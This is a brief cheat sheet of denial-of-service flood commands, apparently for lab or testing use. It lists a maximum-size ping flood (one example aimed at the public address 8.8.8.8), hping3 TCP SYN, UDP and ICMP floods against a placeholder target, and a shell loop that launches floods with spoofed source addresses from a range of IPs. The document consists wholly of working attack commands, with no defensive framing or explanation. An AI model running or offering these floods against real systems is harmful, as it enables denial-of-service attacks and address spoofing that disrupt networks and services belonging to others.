**ICMP PING PACKET**
command
sudo ping -f -s 65500 8.8.8.8

example
sudo ping -f -s 65500 192.168.1.10


**TCP Syn Flood Packet**
command
sudo hping3 -S -p <port> --flood <target_IP>

example
sudo hping3 -S -p 80 --flood 192.168.1.10


**UDP Flood Packet**
command
sudo hping3 --udp -p <port> --flood <target_IP>

example
sudo hping3 --udp -p 53 --flood 192.168.1.10


**Raw IP Flood Traffic**
command
sudo hping3 -1 --flood <target_IP>

example
sudo hping3 -1 --flood 192.168.1.10


**For multiple flood Attack**
for ip in 192.168.1.{100..110}; do
    sudo hping3 -1 --flood -a $ip <target_IP> &
done







